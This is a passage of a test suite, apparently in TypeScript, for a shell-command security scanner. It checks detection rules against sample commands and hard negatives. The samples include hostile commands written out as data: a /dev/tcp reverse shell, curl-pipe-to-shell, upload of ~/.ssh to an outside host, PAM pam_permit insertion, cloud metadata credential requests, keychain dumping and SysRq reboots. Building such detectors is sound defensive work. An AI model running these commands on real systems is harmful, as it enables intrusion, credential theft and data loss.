      `systemd-run --user --unit=job --on-calendar '*:0/1' /bin/sh /tmp/job.sh`,
      "sudo systemd-run --on-active=5m /usr/bin/id",
      "systemd-run --on-boot 10min /opt/job",
      "systemd-run --property=Type=oneshot --on-startup=30s /opt/job",
      "systemd-run --on-unit-active 1h /opt/job",
      "systemd-run --on-unit-inactive=1h /opt/job",
      "systemd-run --on-clock-change=yes /opt/job",
      "systemd-run --on-timezone-change yes /opt/job",
    ];
    for (const source of timers) {
      expect(scan(source).findings).toEqual(expect.arrayContaining([
        expect.objectContaining({
          ruleId: "persistence.systemd-transient-timer",
          category: "persistence",
          confidence: "high",
        }),
      ]));
    }

    const hardNegatives = [
      "systemd-run --unit=job --wait /usr/bin/id",
      "systemd-run --user /opt/job",
      "systemd-run --property=Type=oneshot /opt/job",
      "systemd-run --help",
      "systemctl list-timers",
      "systemctl status job.timer",
      `systemd-run echo "--on-calendar daily"`,
      `systemd-run --on-calendar "$schedule" /opt/job`,
      "echo \"systemd-run --on-active=5m /opt/job\"",
      "# systemd-run --on-boot=10m /opt/job",
      `systemd-run() { echo "project helper"; }
       systemd-run --on-active=5m /opt/job`,
    ];
    for (const source of hardNegatives) {
      expect(scan(source).findings.some((finding) =>
        finding.ruleId === "persistence.systemd-transient-timer"
      ), source).toBe(false);
    }

    const bypassesShadow = scan(`
      systemd-run() { echo "project helper"; }
      command systemd-run --on-active=5m /opt/job
      sudo systemd-run --on-active=5m /opt/job
    `);
    expect(bypassesShadow.findings.filter((finding) =>
      finding.ruleId === "persistence.systemd-transient-timer"
    )).toHaveLength(2);
  });

  it("detects SysV and rc.d startup enablement without matching service administration", () => {
    const enablements = [
      "update-rc.d T1543.002 defaults",
      "sudo update-rc.d nginx enable",
      "chkconfig audit-helper on",
      "chkconfig --level 345 audit-helper on",
      "sudo service art-test enable",
      "sysrc art_test_enable=YES",
      `sysrc nginx_enable="YES"`,
    ];
    for (const source of enablements) {
      expect(scan(source).findings).toEqual(expect.arrayContaining([
        expect.objectContaining({
          ruleId: "persistence.sysv-enable",
          category: "persistence",
          confidence: "high",
        }),
      ]));
    }

    const hardNegatives = [
      "update-rc.d nginx defaults-disabled",
      "update-rc.d nginx disable",
      "update-rc.d -f nginx remove",
      "update-rc.d --help",
      "chkconfig audit-helper off",
      "chkconfig --list audit-helper",
      "chkconfig audit-helper",
      "service art-test start",
      "service art-test status",
      "service art-test disable",
      "sysrc art_test_enable",
      "sysrc -x art_test_enable",
      "sysrc art_test_enable=NO",
      `sysrc art_test_enable="$enabled"`,
      "echo 'update-rc.d nginx defaults'",
      "# chkconfig audit-helper on",
      `update-rc.d() { echo "project helper"; }
       update-rc.d nginx defaults`,
      `service() { echo "project helper"; }
       service art-test enable`,
    ];
    for (const source of hardNegatives) {
      expect(scan(source).findings.some((finding) =>
        finding.ruleId === "persistence.sysv-enable"
      ), source).toBe(false);
    }

    const bypassesShadow = scan(`
      update-rc.d() { echo "project helper"; }
      service() { echo "project helper"; }
      command update-rc.d nginx defaults
      sudo update-rc.d nginx enable
      command service art-test enable
      sudo service art-test enable
    `);
    expect(bypassesShadow.findings.filter((finding) =>
      finding.ruleId === "persistence.sysv-enable"
    )).toHaveLength(4);
  });

  it("detects cross-platform local account creation without matching account administration", () => {
    const creations = [
      "useradd -M -N -r -s /bin/bash -c evil_account evil_user",
      "sudo useradd --system --shell /usr/sbin/nologin agent",
      "adduser --disabled-password --gecos '' analyst",
      "adduser --system --no-create-home daemon-helper",
      "pw useradd evil_user -s /usr/sbin/nologin -d /nonexistent",
      "pw -R /mnt useradd -n staged_user -s /bin/sh",
      "sudo dscl . -create /Users/evil_user",
    ];
    for (const source of creations) {
      expect(scan(source).findings).toEqual(expect.arrayContaining([
        expect.objectContaining({
          ruleId: "system.account-create",
          category: "system_modification",
          confidence: "high",
        }),
      ]));
    }

    const hardNegatives = [
      "useradd -D",
      "useradd -D -s /bin/bash",
      "useradd --help",
      "useradd --version",
      "useradd -s /bin/bash",
      "userdel evil_user",
      "usermod -aG wheel existing_user",
      "adduser existing_user existing_group",
      "adduser --group project",
      "adduser --help",
      "pw usershow evil_user",
      "pw usermod evil_user -s /bin/sh",
      "pw userdel evil_user",
      "pw useradd -D -s /bin/sh",
      "dscl . -read /Users/evil_user",
      "dscl . -delete /Users/evil_user",
      "dscl . -create /Users/evil_user UserShell /bin/zsh",
      `dscl . -create "/Users/$username"`,
      "kubectl run helper --image=alpine -- sh -lc 'adduser -D evil_user'",
      "echo 'useradd evil_user'",
      "# pw useradd evil_user",
      `useradd() { echo "project helper"; }
       useradd evil_user`,
      `dscl() { echo "directory helper"; }
       dscl . -create /Users/evil_user`,
    ];
    for (const source of hardNegatives) {
      expect(scan(source).findings.some((finding) =>
        finding.ruleId === "system.account-create"
      ), source).toBe(false);
    }

    const bypassesShadow = scan(`
      useradd() { echo "project helper"; }
      dscl() { echo "directory helper"; }
      command useradd evil_user
      sudo useradd --system daemon-helper
      command dscl . -create /Users/evil_user
      sudo dscl . -create /Users/admin-helper
    `);
    expect(bypassesShadow.findings.filter((finding) =>
      finding.ruleId === "system.account-create"
    )).toHaveLength(4);
  });

  it("detects permissive PAM authentication insertion without matching ordinary PAM changes", () => {
    const bypasses = [
      `sudo sed -i "1s,^,auth sufficient pam_succeed_if.so uid >= 0\\\\n,g" /etc/pam.d/su-l`,
      `sed -i '2i\\\\auth sufficient pam_permit.so' /etc/pam.d/login`,
      `echo 'auth sufficient pam_permit.so' >> /etc/pam.d/sshd`,
      `printf '%s\\n' 'auth sufficient pam_succeed_if.so quiet uid >= 0' | sudo tee -a /etc/pam.d/su`,
    ];
    for (const source of bypasses) {
      expect(scan(source).findings).toEqual(expect.arrayContaining([
        expect.objectContaining({
          ruleId: "privilege.pam-bypass",
          category: "privilege_escalation",
          confidence: "high",
          severity: "critical",
        }),
      ]));
    }

    const hardNegatives = [
      `sudo sed -i "\\\\,auth sufficient pam_succeed_if.so uid >= 0,d" /etc/pam.d/su-l`,
      `echo 'auth required pam_unix.so' >> /etc/pam.d/sshd`,
      `echo 'auth sufficient pam_succeed_if.so uid >= 1000' >> /etc/pam.d/su`,
      `echo 'account required pam_permit.so' >> /etc/pam.d/login`,
      `echo 'session optional pam_permit.so' >> /etc/pam.d/login`,
      `echo 'auth required pam_permit.so' >> /etc/pam.d/login`,
      `echo 'auth sufficient pam_rootok.so' >> /etc/pam.d/su`,
      `echo 'auth sufficient pam_permit.so' > /tmp/pam-example`,
      `rule='auth sufficient pam_permit.so'; echo "$rule" >> /etc/pam.d/sshd`,
      `grep 'auth sufficient pam_permit.so' /etc/pam.d/login`,
      `echo "Add auth sufficient pam_permit.so to /etc/pam.d/login"`,
      `# echo 'auth sufficient pam_permit.so' >> /etc/pam.d/login`,
      `sed() { echo "project helper"; }
       sed -i '1i\\\\auth sufficient pam_permit.so' /etc/pam.d/login`,
      `echo() { printf '%s\\n' "$*"; }
       echo 'auth sufficient pam_permit.so' >> /etc/pam.d/login`,
    ];
    for (const source of hardNegatives) {
      expect(scan(source).findings.some((finding) =>
        finding.ruleId === "privilege.pam-bypass"
      ), source).toBe(false);
    }

    const bypassesShadow = scan(`
      sed() { echo "project helper"; }
      echo() { printf '%s\\n' "$*"; }
      command sed -i '1i\\\\auth sufficient pam_permit.so' /etc/pam.d/login
      sudo sed -i '1i\\\\auth sufficient pam_permit.so' /etc/pam.d/sshd
      command echo 'auth sufficient pam_permit.so' >> /etc/pam.d/login
      sudo sh -c "echo 'auth sufficient pam_permit.so' >> /etc/pam.d/sshd"
    `);
    expect(bypassesShadow.findings.filter((finding) =>
      finding.ruleId === "privilege.pam-bypass"
    )).toHaveLength(4);
  });

  it("detects disabling all swap without matching scoped swap administration", () => {
    const globalDisables = [
      "swapoff -a",
      "sudo swapoff --all",
      "swapoff -av",
      "swapoff -va",
    ];
    for (const source of globalDisables) {
      expect(scan(source).findings).toEqual(expect.arrayContaining([
        expect.objectContaining({
          ruleId: "destructive.swap-disable",
          category: "destructive_behavior",
          confidence: "high",
        }),
      ]));
    }

    const hardNegatives = [
      "swapoff /dev/sda2",
      "swapoff -v /swapfile",
      "swapon -a",
      "swapon --show",
      "cat /proc/swaps",
      "free -h",
      "swapoff --help",
      "echo 'swapoff -a'",
      "# swapoff --all",
      `swapoff() { echo "project helper"; }
       swapoff -a`,
    ];
    for (const source of hardNegatives) {
      expect(scan(source).findings.some((finding) =>
        finding.ruleId === "destructive.swap-disable"
      ), source).toBe(false);
    }

    const bypassesShadow = scan(`
      swapoff() { echo "project helper"; }
      command swapoff -a
      sudo swapoff --all
    `);
    expect(bypassesShadow.findings.filter((finding) =>
      finding.ruleId === "destructive.swap-disable"
    )).toHaveLength(2);
  });

  it("detects nmap scans and distinguishes /dev/tcp probes from reverse shells", () => {
    const scans = [
      "nmap -sS 192.0.2.10",
      "sudo nmap -sU -p 53 192.0.2.0/24",
      "nmap -sn example.test",
      "nmap -6 2001:db8::/64",
      "nmap -oX /tmp/report.xml -p80 192.0.2.10",
    ];
    for (const source of scans) {
      expect(scan(source).findings).toEqual(expect.arrayContaining([
        expect.objectContaining({
          ruleId: "network.port-scan",
          category: "network_egress",
          confidence: "high",
        }),
      ]));
    }

    const hardNegatives = [
      "nmap --help",
      "nmap --version",
      "nmap --iflist",
      "nmap --script-help default",
      "nmap -oX /tmp/report.xml",
      "nmap -p 80 \"$target\"",
      "echo 'nmap -sS 192.0.2.10'",
      "# nmap -sn example.test",
      `nmap() { echo "project helper"; }
       nmap -sS 192.0.2.10`,
    ];
    for (const source of hardNegatives) {
      expect(scan(source).findings.some((finding) =>
        finding.ruleId === "network.port-scan"
      ), source).toBe(false);
    }

    const probe = scan(
      `for port in {1..64}; do echo >/dev/tcp/192.0.2.10/$port; done`,
    );
    expect(probe.findings).toEqual(expect.arrayContaining([
      expect.objectContaining({
        ruleId: "network.dev-socket",
        category: "network_egress",
      }),
    ]));
    expect(probe.findings.some((finding) =>
      finding.ruleId === "exfil.reverse-shell"
    )).toBe(false);

    const reverseShell = scan("bash -i >& /dev/tcp/192.0.2.10/4444 0>&1");
    expect(reverseShell.findings).toEqual(expect.arrayContaining([
      expect.objectContaining({ ruleId: "network.dev-socket" }),
      expect.objectContaining({ ruleId: "exfil.reverse-shell" }),
    ]));

    const bypassesShadow = scan(`
      nmap() { echo "project helper"; }
      command nmap -sS 192.0.2.10
      sudo nmap -sS 192.0.2.10
    `);
    expect(bypassesShadow.findings.filter((finding) =>
      finding.ruleId === "network.port-scan"
    )).toHaveLength(2);
  });

  it("detects at job submission without matching at job administration", () => {
    const submissions = [
      `echo "id > /tmp/result" | at 23:59`,
      "at -f /tmp/job.sh now + 1 hour",
      "at --file /tmp/job.sh noon",
      "at -q b -f /tmp/job.sh midnight",
      "at -t 202607292359 <<'EOF'\nid\nEOF",
      "batch <<'EOF'\nid\nEOF",
    ];
    for (const source of submissions) {
      expect(scan(source).findings).toEqual(expect.arrayContaining([
        expect.objectContaining({
          ruleId: "persistence.scheduler-at",
          category: "persistence",
          confidence: "high",
        }),
      ]));
    }

    const hardNegatives = [
      "at",
      "at -l",
      "at --list",
      "atq",
      "at -r 42",
      "at --remove 42",
      "at -d 42",
      "atrm 42",
      "at -c 42",
      "at --cat 42",
      "at --help",
      "at -V",
      "at -f /tmp/job.sh",
      "at \"$when\"",
      "echo 'echo id | at 23:59'",
      "# at -f /tmp/job.sh noon",
      `at() { echo "project helper"; }
       at 23:59`,
    ];
    for (const source of hardNegatives) {
      expect(scan(source).findings.some((finding) =>
        finding.ruleId === "persistence.scheduler-at"
      ), source).toBe(false);
    }

    const bypassesShadow = scan(`
      at() { echo "project helper"; }
      command at 23:59
      sudo at noon
    `);
    expect(bypassesShadow.findings.filter((finding) =>
      finding.ruleId === "persistence.scheduler-at"
    )).toHaveLength(2);
  });

  it("detects cloud metadata credential endpoints without matching ordinary metadata", () => {
    const credentialRequests = [
      "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/role",
      "wget -qO- http://169.254.170.2/v2/credentials/task-id",
      "curl -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
      "curl 'http://169.254.169.254/computeMetadata/v1/instance/service-accounts/build@project.iam.gserviceaccount.com/identity?audience=test'",
      "curl -H Metadata:true 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=x'",
      "wget -qO- http://169.254.169.254/latest/meta-data/ram/security-credentials/example-role",
    ];
    for (const source of credentialRequests) {
      expect(scan(source).findings).toEqual(expect.arrayContaining([
        expect.objectContaining({
          ruleId: "credential.cloud-metadata",
          category: "credential_access",
          confidence: "high",
        }),
      ]));
    }

    const hardNegatives = [
      "curl http://169.254.169.254/latest/api/token",
      "curl http://169.254.169.254/latest/meta-data/instance-id",
      "curl http://169.254.169.254/latest/meta-data/placement/region",
      "curl http://metadata.google.internal/computeMetadata/v1/instance/hostname",
      "curl -H Metadata:true 'http://169.254.169.254/metadata/instance?api-version=2021-02-01'",
      "curl http://169.254.169.254/",
      "curl \"$metadata_url\"",
      "curl --help",
      "echo 'curl http://169.254.169.254/latest/meta-data/iam/security-credentials/role'",
      "# curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
      `curl() { echo "project helper"; }
       curl http://169.254.169.254/latest/meta-data/iam/security-credentials/role`,
    ];
    for (const source of hardNegatives) {
      expect(scan(source).findings.some((finding) =>
        finding.ruleId === "credential.cloud-metadata"
      ), source).toBe(false);
    }

    const bypassesShadow = scan(`
      curl() { echo "project helper"; }
      command curl http://169.254.169.254/latest/meta-data/iam/security-credentials/role
      sudo curl http://169.254.169.254/latest/meta-data/iam/security-credentials/role
    `);
    expect(bypassesShadow.findings.filter((finding) =>
      finding.ruleId === "credential.cloud-metadata"
    )).toHaveLength(2);
  });

  it("detects immediate SysRq reboot without matching ordinary proc configuration", () => {
    const forcedReboots = [
      "echo b > /proc/sysrq-trigger",
      "echo -n 'b' >'/proc/sysrq-trigger'",
      `printf 'b\\n' >/proc/sysrq-trigger`,
      `printf '%s\\n' b > /proc/sysrq-trigger`,
      `sudo sh -c 'echo b > /proc/sysrq-trigger'`,
    ];
    for (const source of forcedReboots) {
      expect(scan(source).findings).toEqual(expect.arrayContaining([
        expect.objectContaining({
          ruleId: "destructive.sysrq-reboot",
          category: "destructive_behavior",
          confidence: "high",
        }),
      ]));
    }
    expect(scan("echo c > /proc/sysrq-trigger").findings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ ruleId: "destructive.sysrq-crash" }),
      ]),
    );
    expect(scan("printf o >/proc/sysrq-trigger").findings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ ruleId: "destructive.sysrq-poweroff" }),
      ]),
    );

    const hardNegatives = [
      "echo 1 > /proc/sys/kernel/sysrq",
      "cat /proc/sysrq-trigger",
      "echo h > /proc/sysrq-trigger",
      "echo \"$action\" > /proc/sysrq-trigger",
      "echo b > /tmp/sysrq-trigger",
      "echo b",
      "printf b > /proc/sys/kernel/sysrq",
      "echo 'echo b > /proc/sysrq-trigger'",
      "# echo b > /proc/sysrq-trigger",
      `echo() { printf '%s\\n' "$*"; }
       echo b > /proc/sysrq-trigger`,
    ];
    for (const source of hardNegatives) {
      expect(scan(source).findings.some((finding) =>
        finding.ruleId === "destructive.sysrq-reboot"
      ), source).toBe(false);
    }

    const bypassesShadow = scan(`
      echo() { printf '%s\\n' "$*"; }
      command echo b > /proc/sysrq-trigger
      sudo sh -c 'echo b > /proc/sysrq-trigger'
    `);
    expect(bypassesShadow.findings.filter((finding) =>
      finding.ruleId === "destructive.sysrq-reboot"
    )).toHaveLength(2);
  });

  it("detects deletion of all audit rules without matching audit administration", () => {
    const deletions = [
      "auditctl -D",
      "sudo auditctl --delete-all",
    ];
    for (const source of deletions) {
      expect(scan(source).findings).toEqual(expect.arrayContaining([
        expect.objectContaining({
          ruleId: "defense.audit-rules-delete",
          category: "defense_evasion",
          confidence: "high",
        }),
      ]));
    }

    const hardNegatives = [
      "auditctl -d always,exit -S execve",
      "auditctl -l",
      "auditctl -s",
      "auditctl -e 1",
      "auditctl -e 2",
      "auditctl -a always,exit -F arch=b64 -S execve",
      "auditctl -w /etc/passwd -p wa",
      "auditctl --help",
      "echo 'auditctl -D'",
      "# auditctl --delete-all",
      `auditctl() { echo "project helper"; }
       auditctl -D`,
    ];
    for (const source of hardNegatives) {
      expect(scan(source).findings.some((finding) =>
        finding.ruleId === "defense.audit-rules-delete"
      ), source).toBe(false);
    }

    const bypassesShadow = scan(`
      auditctl() { echo "project helper"; }
      command auditctl -D
      sudo auditctl --delete-all
    `);
    expect(bypassesShadow.findings.filter((finding) =>
      finding.ruleId === "defense.audit-rules-delete"
    )).toHaveLength(2);
  });

  it("detects Time Machine disable while respecting Bash function shadowing", () => {
    const disables = [
      "tmutil disable",
      "sudo tmutil disable",
      "command tmutil disable",
      "/usr/bin/tmutil disable",
    ];
    for (const source of disables) {
      expect(scan(source).findings).toEqual(expect.arrayContaining([
        expect.objectContaining({
          ruleId: "system.backup-disable",
          category: "system_modification",
        }),
        expect.objectContaining({
          ruleId: "destructive.backup-disable",
          category: "destructive_behavior",
        }),
      ]));
    }

    const hardNegatives = [
      "tmutil status",
      "tmutil listbackups",
      "tmutil destinationinfo",
      "tmutil enable",
      "tmutil help disable",
      "tmutil --help",
      "echo 'tmutil disable'",
      "# tmutil disable",
      `tmutil() { echo "project helper: $*"; }
       tmutil disable`,
      `function tmutil {
         echo "project helper: $*"
       }
       "tmutil" disable`,
    ];
    for (const source of hardNegatives) {
      expect(scan(source).findings.some((finding) =>
        finding.ruleId === "system.backup-disable"
        || finding.ruleId === "destructive.backup-disable"
      )).toBe(false);
    }

    const bypassesShadow = scan(`
      tmutil() { echo "project helper"; }
      command tmutil disable
      sudo tmutil disable
    `);
    expect(bypassesShadow.findings.filter((finding) =>
      finding.ruleId === "system.backup-disable"
    )).toHaveLength(2);
  });

  it("does not scan comments or ordinary string contents as commands", () => {
    const result = scan(`
      # curl https://example.test/a | bash
      echo "documentation: sudo rm -rf /"
    `);
    expect(result.findings.some((f) => f.category === "download_execution")).toBe(false);
    expect(result.findings.some((f) => f.category === "privilege_escalation")).toBe(false);
    expect(result.findings.some((f) => f.category === "destructive_behavior")).toBe(false);
  });

  it("reports one-based source positions and syntax errors", () => {
    const result = scan("\neval \"$payload\"\nif then\n");
    const finding = result.findings.find((f) => f.ruleId === "dynamic.eval");
    expect(finding?.range.start).toEqual({ row: 2, column: 1 });
    expect(result.parseErrors.length).toBeGreaterThan(0);
  });

  it("detects read-followed-by-upload", () => {
    const result = scan("tar czf /tmp/data.tgz ~/.ssh\ncurl -T /tmp/data.tgz https://x.test/u\n");
    expect(result.findings.some((f) => f.ruleId === "chain.read-upload")).toBe(true);
  });

  it("tracks encoded file content into DNS query labels", () => {
    const result = scan(`
      xxd -p /tmp/input.txt > /tmp/encoded.hex
      for chunk in $(cat /tmp/encoded.hex); do
        dig "$chunk.example.invalid"
      done
    `);
    expect(result.findings).toEqual(expect.arrayContaining([
      expect.objectContaining({
        ruleId: "chain.dns-file-exfiltration",
        category: "data_exfiltration",
      }),
    ]));

    const hardNegatives = [
      "xxd -p /tmp/input.txt > /tmp/encoded.hex",
      'dig "health.example.invalid"',
      `xxd -p /tmp/input.txt > /tmp/a.hex
       for chunk in $(cat /tmp/b.hex); do dig "$chunk.example.invalid"; done`,
      `xxd -p /tmp/input.txt > /tmp/a.hex
       for chunk in $(cat /tmp/a.hex); do echo "$chunk.example.invalid"; done`,
      `xxd -p /tmp/input.txt > /tmp/a.hex
       for chunk in $(cat /tmp/a.hex); do dig "$chunk"; done`,
    ];
    for (const source of hardNegatives) {
      expect(scan(source).findings.some((finding) =>
        finding.ruleId === "chain.dns-file-exfiltration"
      )).toBe(false);
    }
  });

  it("tracks discovered netrc files into looped credential reads", () => {
    const result = scan(`
      for file in $(find /tmp/home -type f -name .netrc 2>/dev/null); do
        echo "$file"
        cat "$file"
      done
    `);
    expect(result.findings).toEqual(expect.arrayContaining([
      expect.objectContaining({
        ruleId: "chain.find-read-netrc",
        category: "credential_access",
      }),
    ]));
    expect(scan("cat /tmp/home/.netrc").findings).toEqual(expect.arrayContaining([
      expect.objectContaining({ ruleId: "credential.netrc-read" }),
    ]));

    const hardNegatives = [
      "find /tmp/home -type f -name .netrc",
      `for file in $(find /tmp/home -name .netrc); do echo "$file"; done`,
      `for file in $(find /tmp/home -name .bashrc); do cat "$file"; done`,
      `for file in $(find /tmp/home -name .netrc); do cat "$other"; done`,
      `for file in $(find /tmp/home -name .netrc); do cat /tmp/public.txt; done`,
      "echo 'cat ~/.netrc'",
    ];
    for (const source of hardNegatives) {
      expect(scan(source).findings.some((finding) =>
        finding.ruleId === "chain.find-read-netrc"
        || finding.ruleId === "credential.netrc-read"
      )).toBe(false);
    }
  });

  it("detects macOS Keychain credential extraction without flagging certificate operations", () => {
    const credentialCommands = [
      "security dump-keychain -d login.keychain",
      "sudo security dump-keychain login.keychain-db",
      "security find-generic-password -s example -w",
      "security find-internet-password -a user -w",
    ];
    for (const source of credentialCommands) {
      expect(scan(source).findings.some((finding) =>
        finding.ruleId === "credential.macos-keychain"
      )).toBe(true);
    }

    const hardNegatives = [
      "security find-certificate -a -p",
      "security import /tmp/cert.pem -k login.keychain",
      "security list-keychains",
      "security find-generic-password -s example",
      "security find-internet-password -a user",
      "security help dump-keychain",
      "echo 'security dump-keychain login.keychain'",
    ];
    for (const source of hardNegatives) {
      expect(scan(source).findings.some((finding) =>
        finding.ruleId === "credential.macos-keychain"
      )).toBe(false);
    }
  });

  it("detects LaZagne browser credential modules without matching ordinary scripts", () => {
    const credentialDumps = [
      "python3 /tmp/atomic-LaZagne/laZagne.py browsers -firefox",
      "python /opt/LaZagne/Linux/laZagne.py browsers all",
      "sudo python3 /var/tmp/LaZagne/Linux/laZagne.py browsers -firefox",
    ];
    for (const source of credentialDumps) {
      expect(scan(source).findings).toEqual(expect.arrayContaining([
        expect.objectContaining({
          ruleId: "credential.lazagne-browser",
          category: "credential_access",
        }),
      ]));
    }

    const hardNegatives = [
      "python3 /tmp/project/laZagne.py browsers -firefox",
      "python3 /tmp/LaZagne/Linux/helper.py browsers -firefox",
      "python3 /tmp/LaZagne/Linux/laZagne.py sysadmin",
      "python3 /tmp/LaZagne/Linux/laZagne.py browsers --help",
      "python3 /tmp/LaZagne/Linux/laZagne.py --help",
      "python3 /tmp/LaZagne/Linux/laZagne.py browsers",
      "python3 /tmp/lazagne-report.py browsers -firefox",
      "echo 'python3 /tmp/LaZagne/Linux/laZagne.py browsers -firefox'",
      "# python3 /tmp/LaZagne/Linux/laZagne.py browsers all",
    ];
    for (const source of hardNegatives) {
      expect(scan(source).findings.some((finding) =>
        finding.ruleId === "credential.lazagne-browser"
      )).toBe(false);
    }
  });

  it("allows download-execute from an explicitly trusted exact host", () => {
    const result = scan("curl https://artifacts.corp.example/a.sh | sh", {
      allowedDownloadHosts: ["artifacts.corp.example"],
    });
    expect(result.findings.some((f) => f.category === "download_execution")).toBe(false);
    expect(result.findings.some((f) => f.category === "network_egress")).toBe(true);
  });

  it("supports safe subdomain wildcards without matching lookalikes", () => {
    const options = { allowedDownloadHosts: ["*.corp.example"] };
    expect(scan("curl https://build.corp.example/a | sh", options).findings
      .some((f) => f.category === "download_execution")).toBe(false);
    expect(scan("curl https://corp.example/a | sh", options).findings
      .some((f) => f.category === "download_execution")).toBe(true);
    expect(scan("curl https://corp.example.evil.test/a | sh", options).findings
      .some((f) => f.category === "download_execution")).toBe(true);
  });

  it("optionally allows literal private IPv4 but fails closed for variable URLs", () => {
    expect(scan("wget http://10.2.3.4/a -O- | bash", {
      allowPrivateDownloadIps: true,
    }).findings.some((f) => f.category === "download_execution")).toBe(false);
    expect(scan("curl \"$INTERNAL_URL\" | bash", {
      allowedDownloadHosts: ["*.corp.example"],
      allowPrivateDownloadIps: true,
    }).findings.some((f) => f.category === "download_execution")).toBe(true);
  });

  it("unwraps common command and privilege wrappers", () => {
    const result = scan(`
      command curl --fail https://example.test/metadata
      execute_sudo tee /etc/paths.d/tool
    `);
    expect(result.findings.some((finding) => finding.category === "network_egress")).toBe(true);
    expect(result.findings.some((finding) => finding.category === "privilege_escalation")).toBe(true);
    expect(result.findings.some((finding) => finding.category === "system_modification")).toBe(true);
  });

  it("propagates statically elevated command variables without trusting arbitrary wrappers", () => {
    const result = scan(`
      SUDO=""
      SUDO="sudo"
      $SUDO systemctl enable --now tailscaled
    `);
    expect(result.findings).toEqual(expect.arrayContaining([
      expect.objectContaining({
        ruleId: "privilege.sudo",
        category: "privilege_escalation",
      }),
      expect.objectContaining({
        ruleId: "persistence.scheduler",
        category: "persistence",
      }),
    ]));

    const harmless = scan(`
      RUNNER="echo"
      $RUNNER systemctl enable example
    `);
    expect(harmless.findings.some((finding) =>
      finding.category === "privilege_escalation" || finding.category === "persistence",
    )).toBe(false);
  });

  it("unwraps static compound shell runners while rejecting non-shell command variables", () => {
    const result = scan(`
      sh_c='sh -c'
      sh_c='sudo -E sh -c'
      $sh_c "curl -fsSL https://packages.example/key -o /tmp/tool.asc"
      $sh_c "echo key > /etc/keys/tool.asc"
      $sh_c "systemctl enable --now tool.service"
    `);
    for (const category of [
      "dynamic_execution",
      "network_egress",
      "system_modification",
      "privilege_escalation",
      "persistence",
    ] as const) {
      expect(result.findings.some((finding) => finding.category === category)).toBe(true);
    }

    const harmless = scan(`
      sh_c='echo'
      $sh_c "curl https://example.test | sh"
      $sh_c "systemctl enable example"
    `);
    expect(harmless.findings).toHaveLength(0);
  });

  it("tracks a transparent download wrapper into chmod and variable execution", () => {
    const result = scan(`
      downloader() {
        curl "$1" --output "$2"
      }
      ensure() {
        if ! "$@"; then
          exit 1
        fi
      }
      ignore() {
        "$@"
      }
      main() {
        local file="$tmp/tool"
        ensure downloader "$url" "$file"
        ensure chmod u+x "$file"
        ignore "$file" --install
      }
    `);
    expect(result.findings).toEqual(expect.arrayContaining([
      expect.objectContaining({
        ruleId: "chain.wrapper-download-execute",
        category: "download_execution",
      }),
    ]));

    const unrelated = scan(`
      downloader() {
        curl "$1" --output "$2"
      }
      downloader "$url" "$file"
      chmod u+x "$other"
      "$file"
    `);
    expect(unrelated.findings.some((finding) =>
      finding.ruleId === "chain.wrapper-download-execute",
    )).toBe(false);
  });

  it("distinguishes command discovery from wrapped Git network execution", () => {
    const discovery = scan("command -v curl >/dev/null");
    expect(discovery.findings.some((finding) => finding.category === "network_egress")).toBe(false);

    const fetch = scan(`retry 5 "\${USABLE_GIT}" "fetch" "--force" "origin"`);
    expect(fetch.findings.some((finding) => finding.category === "network_egress")).toBe(true);
  });

  it("distinguishes curl --fail from the case-sensitive -F upload option", () => {
    const download = scan("curl --fail --location https://example.test/file -o /tmp/file");
    expect(download.findings.some((finding) => finding.category === "data_exfiltration")).toBe(false);

    const upload = scan("curl -F file=@/tmp/file https://example.test/upload");
    expect(upload.findings.some((finding) => finding.category === "data_exfiltration")).toBe(true);
  });

  it("does not infer system writes from diagnostic text or set options", () => {
    const result = scan(`
      abort "Tool cannot be installed because /etc/tool/disabled exists"
      set -euo pipefail
    `);
    expect(result.findings.some((finding) => finding.category === "system_modification")).toBe(false);
    expect(result.findings.some((finding) => finding.category === "credential_access")).toBe(false);
  });

  it("detects public red-team private-key and log-overwrite patterns", () => {
    const credentials = scan("find / -name id_rsa 2>/dev/null");
    expect(credentials.findings.some((finding) => finding.category === "credential_access")).toBe(true);

    const overwrite = scan("dd of=/var/log/syslog if=/dev/zero count=1024");
    expect(overwrite.findings.some((finding) => finding.category === "defense_evasion")).toBe(true);
    expect(overwrite.findings.some((finding) => finding.category === "destructive_behavior")).toBe(true);
  });

  it("detects explicit timestomping without flagging ordinary touch updates", () => {
    const explicit = scan("touch -a -t 197001010000.00 /tmp/payload");
    expect(explicit.findings).toEqual(expect.arrayContaining([
      expect.objectContaining({
        ruleId: "defense.timestomp",
        category: "defense_evasion",
      }),
    ]));

    const reference = scan("touch -acmr /bin/sh /tmp/payload");
    expect(reference.findings.some((finding) =>
      finding.ruleId === "defense.timestomp"
    )).toBe(true);

    const hardNegatives = [
      "touch /tmp/new-file",
      "touch -a /tmp/accessed-now",
      "touch -m /tmp/modified-now",
      "touch -c /tmp/existing-only",
      "touch -a -d now /tmp/accessed-now",
      "echo 'touch -t 197001010000.00 /tmp/example'",
    ];
    for (const source of hardNegatives) {
      expect(scan(source).findings.some((finding) =>
        finding.ruleId === "defense.timestomp"
      )).toBe(false);
    }
  });

  it("detects SUID and SGID additions in combined symbolic chmod modes", () => {
    const privilegedModes = [
      "chmod u+xs /tmp/tool",
      "chmod g+xs /tmp/tool",
      "chmod u+x,g+s /tmp/tool",
      "chmod -- a+rsx /tmp/tool",
      "chmod 4755 /tmp/tool",
      "chmod 2750 /tmp/tool",
    ];
    for (const source of privilegedModes) {
      expect(scan(source).findings.some((finding) =>
        finding.ruleId === "privilege.suid-capability"
      )).toBe(true);
    }

    const hardNegatives = [
      "chmod u+x /tmp/tool",
      "chmod g+x /tmp/tool",
      "chmod u-s /tmp/tool",
      "chmod u+x,g-s /tmp/tool",
      "chmod 0755 /tmp/tool",
      "find /usr/bin -perm -4000",
      "chown root /tmp/tool",
    ];
    for (const source of hardNegatives) {
      expect(scan(source).findings.some((finding) =>
        finding.ruleId === "privilege.suid-capability"
      )).toBe(false);
    }
  });

  it("detects firewall shutdown without flagging firewall administration", () => {
    const disabled = scan("ufw disable");
    expect(disabled.findings).toEqual(expect.arrayContaining([
      expect.objectContaining({
        ruleId: "system.firewall-disable",
        category: "system_modification",
      }),
      expect.objectContaining({
        ruleId: "defense.security-control",
        category: "defense_evasion",
      }),
    ]));

